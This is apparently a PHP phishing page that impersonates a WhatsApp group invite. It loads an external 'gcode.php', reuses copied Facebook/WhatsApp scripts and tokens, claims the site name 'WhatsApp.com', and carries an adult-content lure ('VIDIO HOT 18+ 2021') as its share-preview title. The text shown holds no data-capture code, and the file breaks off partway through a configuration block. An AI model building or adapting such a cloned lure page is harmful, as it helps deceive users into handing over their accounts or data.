<?php 
include 'gcode.php'; 
?>
<!DOCTYPE html>
<html lang="en" id="facebook" class="no_js">

<head>
    <meta charset="utf-8" />
    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
    <script nonce="ZGTlWaQE">
        window._cstart = +new Date();
    </script>
    <script nonce="ZGTlWaQE">
        function envFlush(a) {
            function b(b) {
                for (var c in a) b[c] = a[c]
            }
            window.requireLazy ? window.requireLazy(["Env"], b) : (window.Env = window.Env || {}, b(window.Env))
        }
        envFlush({
            "ajaxpipe_token": "AXi0aewru0KJpwDvoN4",
            "timeslice_heartbeat_config": {
                "pollIntervalMs": 33,
                "idleGapThresholdMs": 60,
                "ignoredTimesliceNames": {
                    "requestAnimationFrame": true,
                    "Event listenHandler mousemove": true,
                    "Event listenHandler mouseover": true,
                    "Event listenHandler mouseout": true,
                    "Event listenHandler scroll": true
                },
                "isHeartbeatEnabled": true,
                "isArtilleryOn": false
            },
            "shouldLogCounters": true,
            "timeslice_categories": {
                "react_render": true,
                "reflow": true
            },
            "sample_continuation_stacktraces": true,
            "gk_requirelazy_mem": true,
            "stack_trace_limit": 30,
            "timesliceBufferSize": 5000,
            "show_invariant_decoder": false,
            "compat_iframe_token": "AQ7aeRe6kmDO9GIR-fc",
            "isCQuick": false
        });
    </script>
    <style nonce="ZGTlWaQE"></style>
    <script nonce="ZGTlWaQE">
        __DEV__ = 0;
        CavalryLogger = window.CavalryLogger || function(a) {
            this.lid = a, this.transition = !1, this.metric_collected = !1, this.is_detailed_profiler = !1, this.instrumentation_started = !1, this.pagelet_metrics = {}, this.events = {}, this.ongoing_watch = {}, this.values = {
                t_cstart: window._cstart
            }, this.piggy_values = {}, this.bootloader_metrics = {}, this.resource_to_pagelet_mapping = {}, this.initializeInstrumentation && this.initializeInstrumentation()
        }, CavalryLogger.prototype.setIsDetailedProfiler = function(a) {
            this.is_detailed_profiler = a;
            return this
        }, CavalryLogger.prototype.setTTIEvent = function(a) {
            this.tti_event = a;
            return this
        }, CavalryLogger.prototype.setValue = function(a, b, c, d) {
            d = d ? this.piggy_values : this.values;
            (typeof d[a] === "undefined" || c) && (d[a] = b);
            return this
        }, CavalryLogger.prototype.getLastTtiValue = function() {
            return this.lastTtiValue
        }, CavalryLogger.prototype.setTimeStamp = CavalryLogger.prototype.setTimeStamp || function(a, b, c, d) {
            this.mark(a);
            var e = this.values.t_cstart || this.values.t_start;
            e = d ? e + d : CavalryLogger.now();
            this.setValue(a, e, b, c);
            this.tti_event && a == this.tti_event && (this.lastTtiValue = e, this.setTimeStamp("t_tti", b));
            return this
        }, CavalryLogger.prototype.mark = typeof console === "object" && console.timeStamp ? function(a) {
            console.timeStamp(a)
        } : function() {}, CavalryLogger.prototype.addPiggyback = function(a, b) {
            this.piggy_values[a] = b;
            return this
        }, CavalryLogger.instances = {}, CavalryLogger.id = 0, CavalryLogger.getInstance = function(a) {
            typeof a === "undefined" && (a = CavalryLogger.id);
            CavalryLogger.instances[a] || (CavalryLogger.instances[a] = new CavalryLogger(a));
            return CavalryLogger.instances[a]
        }, CavalryLogger.setPageID = function(a) {
            if (CavalryLogger.id === 0) {
                var b = CavalryLogger.getInstance();
                CavalryLogger.instances[a] = b;
                CavalryLogger.instances[a].lid = a;
                delete CavalryLogger.instances[0]
            }
            CavalryLogger.id = a
        }, CavalryLogger.now = function() {
            return window.performance && performance.timing && performance.timing.navigationStart && performance.now ? performance.now() + performance.timing.navigationStart : new Date().getTime()
        }, CavalryLogger.prototype.measureResources = function() {}, CavalryLogger.prototype.profileEarlyResources = function() {}, CavalryLogger.getBootloaderMetricsFromAllLoggers = function() {}, CavalryLogger.start_js = function() {}, CavalryLogger.done_js = function() {};
        CavalryLogger.getInstance().setTTIEvent("t_domcontent");
        CavalryLogger.prototype.measureResources = function(a, b) {
            if (!this.log_resources) return;
            var c = "bootload/" + a.name;
            if (this.bootloader_metrics[c] !== void 0 || this.ongoing_watch[c] !== void 0) return;
            var d = CavalryLogger.now();
            this.ongoing_watch[c] = d;
            "start_" + c in this.bootloader_metrics || (this.bootloader_metrics["start_" + c] = d);
            b && !("tag_" + c in this.bootloader_metrics) && (this.bootloader_metrics["tag_" + c] = b);
            if (a.type === "js") {
                c = "js_exec/" + a.name;
                this.ongoing_watch[c] = d
            }
        }, CavalryLogger.prototype.stopWatch = function(a) {
            if (this.ongoing_watch[a]) {
                var b = CavalryLogger.now(),
                    c = b - this.ongoing_watch[a];
                this.bootloader_metrics[a] = c;
                var d = this.piggy_values;
                a.indexOf("bootload") === 0 && (d.t_resource_download || (d.t_resource_download = 0), d.resources_downloaded || (d.resources_downloaded = 0), d.t_resource_download += c, d.resources_downloaded += 1, d["tag_" + a] == "_EF_" && (d.t_pagelet_cssload_early_resources = b));
                delete this.ongoing_watch[a]
            }
            return this
        }, CavalryLogger.getBootloaderMetricsFromAllLoggers = function() {
            var a = {};
            Object.values(window.CavalryLogger.instances).forEach(function(b) {
                b.bootloader_metrics && Object.assign(a, b.bootloader_metrics)
            });
            return a
        }, CavalryLogger.start_js = function(a) {
            for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("js_exec/" + a[b])
        }, CavalryLogger.done_js = function(a) {
            for (var b = 0; b < a.length; ++b) CavalryLogger.getInstance().stopWatch("bootload/" + a[b])
        }, CavalryLogger.prototype.profileEarlyResources = function(a) {
            for (var b = 0; b < a.length; b++) this.measureResources({
                name: a[b][0],
                type: a[b][1] ? "js" : ""
            }, "_EF_")
        };
        CavalryLogger.getInstance().log_resources = true;
        CavalryLogger.getInstance().setIsDetailedProfiler(true);
        window.CavalryLogger && CavalryLogger.getInstance().setTimeStamp("t_start");
    </script><noscript>
        <meta http-equiv="refresh" content="0; URL=/FMCUd5UuooX7zA9uKvky4B?lang=en&amp;_fb_noscript=1" />
    </noscript>
    <title id="pageTitle">WhatsApp Group Invite</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
    <meta name="theme-color" content="#1BA691" />
    <meta name="msapplication-navbutton-color" content="#1BA691" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta property="og:title" content="VIDIO HOT 18+ 2021" />
    <meta property="og:image" content="img/grup.jpeg" />
    <meta property="og:site_name" content="WhatsApp.com" />
    <meta property="og:description" content="WhatsApp Group Invite" />
    <meta property="description" content="WhatsApp Group Invite" />
    <meta name="apple-mobile-web-app-status-bar-style" content="#1BA691" />
    <meta name="mobile-web-app-capable" content="yes" />
    <style nonce="ZGTlWaQE">
        #hide_till_load {
            display: block !important;
        }
    </style>
    <meta name="robots" content="noindex" />
    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/v3/yP/r/rYZqPCBaG70.png" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/y7/l/0,cross/li1FVv8ji_p.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="w0wbZxI" crossorigin="anonymous" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yP/l/0,cross/bnJ_4exZTkM.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="ULMb96V" crossorigin="anonymous" />
    <script src="https://static.xx.fbcdn.net/rsrc.php/v3/yp/r/oJrb3s-Lusb.js?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="pgovsL/" crossorigin="anonymous" nonce="ZGTlWaQE"></script>
    <script nonce="ZGTlWaQE">
        requireLazy(["HasteSupportData"], function(m) {
            m.handle({
                "clpData": {
                    "1897611": {
                        "r": 1,
                        "s": 1
                    },
                    "1949898": {
                        "r": 1
                    },
                    "1848815": {
                        "r": 10000,
                        "s": 1
                    }
                },
                "gkxData": {
                    "185": {
                        "result": false,
                        "hash": "AT5MqNOYoEUII06PZHw"
                    },
                    "708253": {
                        "result": false,
                        "hash": "AT5n4hBL3YTMnQWto70"
                    },
                    "996940": {
                        "result": false,
                        "hash": "AT7opYuEGy3sjG1abco"
                    },
                    "1073500": {
                        "result": true,
                        "hash": "AT7aJmfnqWyioxOOI48"
                    },
                    "1224637": {
                        "result": false,
                        "hash": "AT7JRluWxuwDm3XzlYs"
                    },
                    "1263340": {
                        "result": false,
                        "hash": "AT5bwizWgDaFQudmrNA"
                    },
                    "113": {
                        "result": false,
                        "hash": "AT4UEBnCWWtisiAcIrw"
                    },
                    "676837": {
                        "result": false,
                        "hash": "AT4N8wBZA8ctCdHwE6c"
                    },
                    "676920": {
                        "result": false,
                        "hash": "AT497IX4gOFG8gZe3HI"
                    },
                    "1857581": {
                        "result": false,
                        "hash": "AT5yTxGMp6le0PAtB2k"
                    },
                    "1952739": {
                        "result": true,
                        "hash": "AT4Zq7lXWSlD3PCkiTU"
                    },
                    "1955413": {
                        "result": true,
                        "hash": "AT5Tny0Wtlel6ZKHYFg"
                    }
                }
            })
        });
        requireLazy(["TimeSliceImpl", "ServerJS"], function(TimeSlice, ServerJS) {
            (new ServerJS()).handle({
                "define": [
                    ["URLFragmentPreludeConfig", [], {
                        "hashtagRedirect": false,
                        "fragBlacklist": ["nonce", "access_token", "oauth_token", "xs", "checkpoint_data", "code"]
                    }, 137],
                    ["BootloaderConfig", [], {
                        "deferBootloads": false,
                        "jsRetries": [200, 500],
                        "jsRetryAbortNum": 2,
                        "jsRetryAbortTime": 5,
                        "silentDups": false,
                        "hypStep4": false
                    }, 329],
                    ["CSSLoaderConfig", [], {
                        "timeout": 5000,
                        "modulePrefix": "BLCSS:",
                        "loadEventSupported": true
                    }, 619],
                    ["CookieCoreConfig", [], {}, 2104],
                    ["CurrentCommunityInitialData", [], {}, 490],
                    ["CurrentEnvironment", [], {
                        "facebookdotcom": true,
                        "messengerdotcom": false,
                        "workplacedotcom": false
                    }, 827],
                    ["CurrentUserInitialData", [], {
                        "ACCOUNT_ID": "0",
                        "USER_ID": "0",
                        "NAME": "",
                        "SHORT_NAME": null,
                        "IS_BUSINESS_PERSON_ACCOUNT": false,
                        "HAS_SECONDARY_BUSINESS_PERSON": false,
                        "IS_MESSENGER_ONLY_USER": false,
                        "IS_DEACTIVATED_ALLOWED_ON_MESSENGER": false,
                        "IS_MESSENGER_CALL_GUEST_USER": false,
                        "IS_WORK_MESSENGER_CALL_GUEST_USER": false,
                        "APP_ID": "256281040558",
                        "IS_BUSINESS_DOMAIN": false
                    }, 270],
                    ["DTSGInitialData", [], {}, 258],
                    ["ISB", [], {}, 330],
                    ["LSD", [], {
                        "token": "TRoV9PIlW7gxlOfPCDwJOq"
                    }, 323],
                    ["ServerNonce", [], {
                        "ServerNonce": "LIDy6VPz1ybFfncjqnbamg"
                    }, 141],
                    ["SiteData", [], {
                        "server_revision": 1003834407,
                        "client_revision": 1003834407,
                        "tier": "",
                        "push_phase": "C3",
                        "pkg_cohort": "PHASED:whatsapp_www_pkg",
                        "haste_session": "18768.PHASED:whatsapp_www_pkg.2.0.0.0",
                        "pr": 1,
                        "haste_site": "www",
                        "be_one_ahead": false,
                        "ir_on": true,
                        "is_rtl": false,
                        "is_comet": false,
                        "is_experimental_tier": false,
                        "is_jit_warmed_up": true,
                        "hsi": "6964743093834304946-0",
                        "semr_host_bucket": "6",
                        "bl_hash_version": 2,
                        "skip_rd_bl": true,
                        "spin": 0,
                        "__spin_r": 1003834407,
                        "__spin_b": "trunk",
                        "__spin_t": 1621605616,
                        "vip": "31.13.95.60"
                    }, 317],
                    ["SprinkleConfig", [], {
                        "param_name": "jazoest",
                        "version": 2,
                        "should_randomize": false
                    }, 2111],
                    ["UserAgentData", [], {
                        "browserArchitecture": "64",
                        "browserFullVersion": "90.0.4430.212",
                        "browserMinorVersion": 0,
                        "browserName": "Chrome",
                        "browserVersion": 90,
                        "deviceName": "Unknown",
                        "engineName": "WebKit",
                        "engineVersion": "537.36",
                        "platformArchitecture": "64",
                        "platformName": "Windows",
                        "platformVersion": "10",
                        "platformFullVersion": "10"
                    }, 527],
                    ["PromiseUsePolyfillSetImmediateGK", [], {
                        "www_always_use_polyfill_setimmediate": false
                    }, 2190],
                    ["KSConfig", [], {
                        "killed": {
                            "__set": ["MLHUB_FLOW_AUTOREFRESH_SEARCH", "NEKO_DISABLE_CREATE_FOR_SAP", "EO_DISABLE_SYSTEM_SERIAL_NUMBER_FREE_TYPING_IN_CPE_NON_CLIENT", "EO_SRT_HELPDESK_DASHBOARD_DISABLE_UNUSED_TAB_IN_RIGHT_PANEL", "MOBILITY_KILL_OLD_VISIBILITY_POSITION_SETTING", "WORKPLACE_DISPLAY_TEXT_EVIDENCE_REPORTING", "BUSINESS_INVITE_FLOW_WITH_SELLER_PROFILE", "ADS_TEMPLATE_UNIFICATION_IN_IG_STORIES", "DCP_CYCLE_COUNT_CLASSIFICATION_UI", "BUY_AT_NEW_START_REQUEST_DSUL_BANNER", "BUY_AT_UI_LINE_DELETE", "BUSINESS_GRAPH_SETTING_APP_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_BU_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_ESG_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_PRODUCT_CATALOG_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_SESG_ASSIGNED_USERS_NEW_API", "BUSINESS_GRAPH_SETTING_WABA_ASSIGNED_USERS_NEW_API", "ADS_PLACEMENT_FIX_PUBLISHER_PLATFORMS_MUTATION", "FORCE_FETCH_BOOSTED_COMPONENT_AFTER_ADS_CREATION", "VIDEO_DIMENSIONS_FROM_PLAYER_IN_UPLOAD_DIALOG", "SNIVY_GROUP_BY_EVENT_TRACE_ID_AND_NAME", "ADS_STORE_VISITS_METRICS_DEPRECATION", "DYNAMIC_ADS_SET_CATALOG_AND_PRODUCT_SET_TOGETHER", "AD_DRAFT_ENABLE_SYNCRHONOUS_FRAGMENT_VALIDATION", "NEKO_ENABLE_RESET_SAP_FOR_CREATE_AD_SET_CONTEXTUAL", "LAB_NET_NEW_UI_RELEASE", "HELPDESK_USE_XDS_SEARCHABLE_INPUT_FOR_WORKFLOW", "POCKET_MONSTERS_CREATE", "POCKET_MONSTERS_DELETE", "SRT_BANZAI_SRT_CORE_LOGGER", "SRT_BANZAI_SRT_MAIN_LOGGER", "SIMPL_SAMPLING_HEALTH_CARD", "WORKPLACE_PLATFORM_SECURE_APPS_MAILBOXES", "POCKET_MONSTERS_UPDATE_NAME", "ADS_INTEGRATION_PORTAL_RELAY_LIVE"]
                        },
                        "ko": {
                            "__set": ["3OsLvnSHNTt", "1G7wJ6bJt9K", "9NpkGYwzrPG", "6fHw06UmAMW", "3oh5Mw86USj", "8NAceEy9JZo", "7FOIzos6XJX", "6xuJHOrdskA", "75fREERrb3F", "80ZDn9dpjEA", "rf8JEPGgOi", "4j36SVzvP3w", "4NSq3ZC4ScE", "53gCxKq281G", "3yzzwBY7Npj", "1onzIv0jH6H", "8PlKuowafe8", "1ntjZ2zgf03", "4SIH2GRVX5W", "2dhqRnqXGLQ", "2WgiNOrHVuC", "amKHb4Cw4WI", "5mNEXob0nTj", "8rDvN9vWdAK", "9cL5o2kjfZo", "DDZhogI19W", "aDayprn6pbH", "acrJTh9WGdp", "1oOE64fL4wO", "9Gd8qgRxn8z", "MPMaqnqZ9c", "4MzX0ipjWq", "5XCz1h9Iaw3", "7r6mSP7ofr2", "5zgf0XOYSz7"]
                        }
                    }, 2580],
                    ["JSErrorLoggingConfig", [], {
                        "appId": 256281040558,
                        "extra": [],
                        "reportInterval": 50,
                        "sampleWeight": null,
                        "sampleWeightKey": "__jssesw"
                    }, 2776],
                    ["DataStoreConfig", [], {
                        "expandoKey": "__FB_STORE",
                        "useExpando": true
                    }, 2915],
                    ["CookieCoreLoggingConfig", [], {
                        "maximumIgnorableStallMs": 16.67,
                        "sampleRate": 9.7e-5,
                        "sampleRateClassic": 1.0e-10,
                        "sampleRateFastStale": 1.0e-8
                    }, 3401],
                    ["ImmediateImplementationExperiments", [], {
                        "prefer_message_channel": true
                    }, 3419],
                    ["DTSGInitData", [], {
                        "token": "",
                        "async_get_token": ""
                    }, 3515],
                    ["UriNeedRawQuerySVConfig", [], {
                        "uris": ["dms.netmng.com", "doubleclick.net", "r.msn.com", "watchit.sky.com", "graphite.instagram.com", "www.kfc.co.th", "learn.pantheon.io", "www.landmarkshops.in", "www.ncl.com", "s0.wp.com", "www.tatacliq.com", "bs.serving-sys.com", "kohls.com", "lazada.co.th", "xg4ken.com", "technopark.ru", "officedepot.com.mx", "bestbuy.com.mx", "booking.com"]
                    }, 3871],
                    ["InitialCookieConsent", [], {
                        "deferCookies": false,
                        "initialConsent": {
                            "__set": [1, 2]
                        },
                        "noCookies": false,
                        "shouldShowCookieBanner": false
                    }, 4328],
                    ["TrustedTypesConfig", [], {
                        "useTrustedTypes": false,
                        "reportOnly": false
                    }, 4548],
                    ["WebConnectionClassServerGuess", [], {
                        "connectionClass": "UNKNOWN"
                    }, 4705],
                    ["CometAltpayJsSdkIframeAllowedDomains", [], {
                        "allowed_domains": ["https:\/\/live.adyen.com", "https:\/\/integration-facebook.payu.in", "https:\/\/facebook.payulatam.com", "https:\/\/secure.payu.com", "https:\/\/facebook.dlocal.com", "https:\/\/buy2.boku.com"]
                    }, 4920],
                    ["BootloaderEndpointConfig", [], {
                        "debugNoBatching": false,
                        "endpointURI": "https:\/\/chat.whatsapp.com\/ajax\/bootloader-endpoint\/"
                    }, 5094],
                    ["BigPipeExperiments", [], {
                        "link_images_to_pagelets": false
                    }, 907],
                    ["AsyncRequestConfig", [], {
                        "retryOnNetworkError": "1",
                        "useFetchStreamAjaxPipeTransport": false
                    }, 328],
                    ["FbtResultGK", [], {
                        "shouldReturnFbtResult": true,
                        "inlineMode": "NO_INLINE"
                    }, 876],
                    ["IntlViewerContext", [], {
                        "GENDER": 3
                    }, 772],
                    ["SessionNameConfig", [], {
                        "seed": "2svA"
                    }, 757],
                    ["ZeroCategoryHeader", [], {}, 1127],
                    ["ZeroRewriteRules", [], {
                        "rewrite_rules": {},
                        "whitelist": {
                            "\/hr\/r": 1,
                            "\/hr\/p": 1,
                            "\/zero\/unsupported_browser\/": 1,
                            "\/zero\/policy\/optin": 1,
                            "\/zero\/optin\/write\/": 1,
                            "\/zero\/optin\/legal\/": 1,
                            "\/zero\/optin\/free\/": 1,
                            "\/about\/privacy\/": 1,
                            "\/about\/privacy\/update\/": 1,
                            "\/about\/privacy\/update": 1,
                            "\/zero\/toggle\/welcome\/": 1,
                            "\/zero\/toggle\/nux\/": 1,
                            "\/zero\/toggle\/settings\/": 1,
                            "\/fup\/interstitial\/": 1,
                            "\/work\/landing": 1,
                            "\/work\/login\/": 1,
                            "\/work\/email\/": 1,
                            "\/ai.php": 1,
                            "\/js_dialog_resources\/dialog_descriptions_android.json": 0,
                            "\/connect\/jsdialog\/MPlatformAppInvitesJSDialog\/": 0,
                            "\/connect\/jsdialog\/MPlatformOAuthShimJSDialog\/": 0,
                            "\/connect\/jsdialog\/MPlatformLikeJSDialog\/": 0,
                            "\/qp\/interstitial\/": 1,
                            "\/qp\/action\/redirect\/": 1,
                            "\/qp\/action\/close\/": 1,
                            "\/zero\/support\/ineligible\/": 1,
                            "\/zero_balance_redirect\/": 1,
                            "\/zero_balance_redirect": 1,
                            "\/zero_balance_redirect\/l\/": 1,
                            "\/l.php": 1,
                            "\/lsr.php": 1,
                            "\/ajax\/dtsg\/": 1,
                            "\/checkpoint\/block\/": 1,
                            "\/exitdsite": 1,
                            "\/zero\/balance\/pixel\/": 1,
                            "\/zero\/balance\/": 1,
                            "\/zero\/balance\/carrier_landing\/": 1,
                            "\/zero\/flex\/logging\/": 1,
                            "\/tr": 1,
                            "\/tr\/": 1,
                            "\/sem_campaigns\/sem_pixel_test\/": 1,
                            "\/bookmarks\/flyout\/body\/": 1,
                            "\/zero\/subno\/": 1,
                            "\/confirmemail.php": 1,
                            "\/policies\/": 1,
                            "\/mobile\/internetdotorg\/classifier\/": 1,
                            "\/zero\/dogfooding": 1,
                            "\/xti.php": 1,
                            "\/zero\/fblite\/config\/": 1,
                            "\/hr\/zsh\/wc\/": 1,
                            "\/ajax\/bootloader-endpoint\/": 1,
                            "\/mobile\/zero\/carrier_page\/": 1,
                            "\/mobile\/zero\/carrier_page\/education_page\/": 1,
                            "\/mobile\/zero\/carrier_page\/feature_switch\/": 1,
                            "\/mobile\/zero\/carrier_page\/settings_page\/": 1,
                            "\/aloha_check_build": 1,
                            "\/upsell\/zbd\/softnudge\/": 1,
                            "\/4oh4.php": 1,
                            "\/autologin.php": 1,
                            "\/birthday_help.php": 1,
                            "\/checkpoint\/": 1,
                            "\/contact-importer\/": 1,
                            "\/cr.php": 1,
                            "\/legal\/terms\/": 1,
                            "\/login.php": 1,
                            "\/login\/": 1,
                            "\/mobile\/account\/": 1,
                            "\/n\/": 1,
                            "\/remote_test_device\/": 1,
                            "\/upsell\/buy\/": 1,
                            "\/upsell\/buyconfirm\/": 1,
                            "\/upsell\/buyresult\/": 1,
                            "\/upsell\/promos\/": 1,
                            "\/upsell\/continue\/": 1,
                            "\/upsell\/h\/promos\/": 1,
                            "\/upsell\/loan\/learnmore\/": 1,
                            "\/upsell\/purchase\/": 1,
                            "\/upsell\/promos\/upgrade\/": 1,
                            "\/upsell\/buy_redirect\/": 1,
                            "\/upsell\/loan\/buyconfirm\/": 1,
                            "\/upsell\/loan\/buy\/": 1,
                            "\/upsell\/sms\/": 1,
                            "\/wap\/a\/channel\/reconnect.php": 1,
                            "\/wap\/a\/nux\/wizard\/nav.php": 1,
                            "\/wap\/appreg.php": 1,
                            "\/wap\/birthday_help.php": 1,
                            "\/wap\/c.php": 1,
                            "\/wap\/confirmemail.php": 1,
                            "\/wap\/cr.php": 1,
                            "\/wap\/login.php": 1,
                            "\/wap\/r.php": 1,
                            "\/zero\/datapolicy": 1,
                            "\/a\/timezone.php": 1,
                            "\/a\/bz": 1,
                            "\/bz\/reliability": 1,
                            "\/r.php": 1,
                            "\/mr\/": 1,
                            "\/reg\/": 1,
                            "\/registration\/log\/": 1,
                            "\/terms\/": 1,
                            "\/f123\/": 1,
                            "\/expert\/": 1,
                            "\/experts\/": 1,
                            "\/terms\/index.php": 1,
                            "\/terms.php": 1,
                            "\/srr\/": 1,
                            "\/msite\/redirect\/": 1,
                            "\/fbs\/pixel\/": 1,
                            "\/contactpoint\/preconfirmation\/": 1,
                            "\/contactpoint\/cliff\/": 1,
                            "\/contactpoint\/confirm\/submit\/": 1,
                            "\/contactpoint\/confirmed\/": 1,
                            "\/contactpoint\/login\/": 1,
                            "\/preconfirmation\/contactpoint_change\/": 1,
                            "\/help\/contact\/": 1,
                            "\/survey\/": 1,
                            "\/upsell\/loyaltytopup\/accept\/": 1,
                            "\/settings\/": 1,
                            "\/lite\/": 1,
                            "\/zero_status_update\/": 1,
                            "\/operator_store\/": 1,
                            "\/upsell\/": 1,
                            "\/wifiauth\/login\/": 1
                        }
                    }, 1478],
                    ["IntlNumberTypeConfig", [], {
                        "impl": "if (n === 1) { return IntlVariations.NUMBER_ONE; } else { return IntlVariations.NUMBER_OTHER; }"
                    }, 3405],
                    ["ServerTimeData", [], {
                        "serverTime": 1621605617156,
                        "timeOfRequestStart": 1621605616816.3,
                        "timeOfResponseStart": 1621605616816.3
                    }, 5943],
                    ["NumberFormatConfig", [], {
                        "decimalSeparator": ",",
                        "numberDelimiter": ".",
                        "minDigitsForThousandsSeparator": 4,
                        "standardDecimalPatternInfo": {
                            "primaryGroupSize": 3,
                            "secondaryGroupSize": 3
                        },
                        "numberingSystemData": null
                    }, 54],
                    ["IntlPhonologicalRules", [], {
                        "meta": {},
                        "patterns": {}
                    }, 1496],
                    ["FbtQTOverrides", [], {
                        "overrides": {
                            "1_67ad5315408c8b2ca54632a045ca474a": "Pertanyaan Keanggotaan"
                        }
                    }, 551],
                    ["AnalyticsCoreData", [], {
                        "device_id": "$^|Acajos3997X0AYRaHuV1jTRUPsnt80z7RKJTsW7Jc7HtbCcIaWakQnZIFexiQuZsKJzFxg5wiEulY6SpTWaVcBhojKlgnEtfMw|fd.AcYuVWn-z6tR_1xUUzJQUK7G9yahMOSCw1IUWRUpgfacgna9DToXzapPpU7-AEY9ehrxFQorGtfY6WQWM5fQGDqW",
                        "app_id": "256281040558",
                        "enable_bladerunner": false,
                        "enable_ack": false,
                        "push_phase": "C3",
                        "enable_observer": false
                    }, 5237],
                    ["cr:696703", [], {
                        "__rc": [null, "Aa0Su-D0SbpvjPUONAaqkqZ-3TEvHz5eS-RKn4RaCxxjiU275ge6KC9hrm2kwBilOWk6bo2ezHZ4hJkZBOAVKeF0AQY"]
                    }, -1],
                    ["cr:708886", ["EventProfilerImpl"], {
                        "__rc": ["EventProfilerImpl", "Aa0Su-D0SbpvjPUONAaqkqZ-3TEvHz5eS-RKn4RaCxxjiU275ge6KC9hrm2kwBilOWk6bo2ezHZ4hJkZBOAVKeF0AQY"]
                    }, -1],
                    ["cr:717822", ["TimeSliceImpl"], {
                        "__rc": ["TimeSliceImpl", "Aa0Su-D0SbpvjPUONAaqkqZ-3TEvHz5eS-RKn4RaCxxjiU275ge6KC9hrm2kwBilOWk6bo2ezHZ4hJkZBOAVKeF0AQY"]
                    }, -1],
                    ["cr:806696", ["clearTimeoutBlue"], {
                        "__rc": ["clearTimeoutBlue", "Aa0Su-D0SbpvjPUONAaqkqZ-3TEvHz5eS-RKn4RaCxxjiU275ge6KC9hrm2kwBilOWk6bo2ezHZ4hJkZBOAVKeF0AQY"]
                    }, -1],
                    ["cr:807042", ["setTimeoutBlue"], {
                        "__rc": ["setTimeoutBlue", "Aa0Su-D0SbpvjPUONAaqkqZ-3TEvHz5eS-RKn4RaCxxjiU275ge6KC9hrm2kwBilOWk6bo2ezHZ4hJkZBOAVKeF0AQY"]
                    }, -1],
                    ["cr:896462", ["setIntervalAcrossTransitionsBlue"], {
                        "__rc": ["setIntervalAcrossTransitionsBlue", "Aa0Su-D0SbpvjPUONAaqkqZ-3TEvHz5eS-RKn4RaCxxjiU275ge6KC9hrm2kwBilOWk6bo2ezHZ4hJkZBOAVKeF0AQY"]
                    }, -1],
                    ["cr:986633", ["setTimeoutAcrossTransitionsBlue"], {
                        "__rc": ["setTimeoutAcrossTransitionsBlue", "Aa0Su-D0SbpvjPUONAaqkqZ-3TEvHz5eS-RKn4RaCxxjiU275ge6KC9hrm2kwBilOWk6bo2ezHZ4hJkZBOAVKeF0AQY"]
                    }, -1],
                    ["cr:1003267", ["clearIntervalBlue"], {
                        "__rc": ["clearIntervalBlue", "Aa0Su-D0SbpvjPUONAaqkqZ-3TEvHz5eS-RKn4RaCxxjiU275ge6KC9hrm2kwBilOWk6bo2ezHZ4hJkZBOAVKeF0AQY"]
                    }, -1],
                    ["cr:1183579", ["InlineFbtResultImpl"], {
                        "__rc": ["InlineFbtResultImpl", "Aa0Su-D0SbpvjPUONAaqkqZ-3TEvHz5eS-RKn4RaCxxjiU275ge6KC9hrm2kwBilOWk6bo2ezHZ4hJkZBOAVKeF0AQY"]
                    }, -1],
                    ["cr:925100", ["RunBlue"], {
                        "__rc": ["RunBlue", "Aa0Su-D0SbpvjPUONAaqkqZ-3TEvHz5eS-RKn4RaCxxjiU275ge6KC9hrm2kwBilOWk6bo2ezHZ4hJkZBOAVKeF0AQY"]
                    }, -1],
                    ["cr:1642797", ["BanzaiBase"], {
                        "__rc": ["BanzaiBase", "Aa0Su-D0SbpvjPUONAaqkqZ-3TEvHz5eS-RKn4RaCxxjiU275ge6KC9hrm2kwBilOWk6bo2ezHZ4hJkZBOAVKeF0AQY"]
                    }, -1],
                    ["cr:729414", [], {
                        "__rc": [null, "Aa0ZTCSJeh7qLfWAL-JpEhNpU7XBaoZ_oLSb7ZWHoVYWwTvOWY9JRLjIg_ywwMAnONym6VJmo0nB4X54SfABEK5Q"]
                    }, -1],
                    ["cr:1094907", [], {
                        "__rc": [null, "Aa34MSGoHZXaM-0VUeAvNi-PupVnysgIO7J9LRoYdUnVeiV-YIjk7qGu7rBNMtUTRBBF4x4qs2ZMwT9c2fXgVCQ"]
                    }, -1],
                    ["EventConfig", [], {
                        "sampling": {
                            "bandwidth": 0,
                            "play": 0,
                            "playing": 0,
                            "progress": 0,
                            "pause": 0,
                            "ended": 0,
                            "seeked": 0,
                            "seeking": 0,
                            "waiting": 0,
                            "loadedmetadata": 0,
                            "canplay": 0,
                            "selectionchange": 0,
                            "change": 0,
                            "timeupdate": 0,
                            "adaptation": 0,
                            "focus": 0,
                            "blur": 0,
                            "load": 0,
                            "error": 0,
                            "message": 0,
                            "abort": 0,
                            "storage": 0,
                            "scroll": 200000,
                            "mousemove": 20000,
                            "mouseover": 10000,
                            "mouseout": 10000,
                            "mousewheel": 1,
                            "MSPointerMove": 10000,
                            "keydown": 0.1,
                            "click": 0.02,
                            "mouseup": 0.02,
                            "__100ms": 0.001,
                            "__default": 5000,
                            "__min": 100,
                            "__interactionDefault": 200,
                            "__eventDefault": 100000
                        },
                        "page_sampling_boost": 1,
                        "interaction_regexes": {},
                        "interaction_boost": {},
                        "event_types": {},
                        "manual_instrumentation": false,
                        "profile_eager_execution": false,
                        "disable_heuristic": true,
                        "disable_event_profiler": false
                    }, 1726],
                    ["AdsInterfacesSessionConfig", [], {}, 2393],
                    ["BanzaiConfig", [], {
                        "MAX_SIZE": 10000,
                        "MAX_WAIT": 150000,
                        "MIN_WAIT": null,
                        "RESTORE_WAIT": 150000,
                        "blacklist": ["time_spent"],
                        "disabled": false,
                        "gks": {
                            "boosted_pagelikes": true,
                            "mercury_send_error_logging": true,
                            "platform_oauth_client_events": true,
                            "visibility_tracking": true,
                            "graphexplorer": true,
                            "sticker_search_ranking": true,
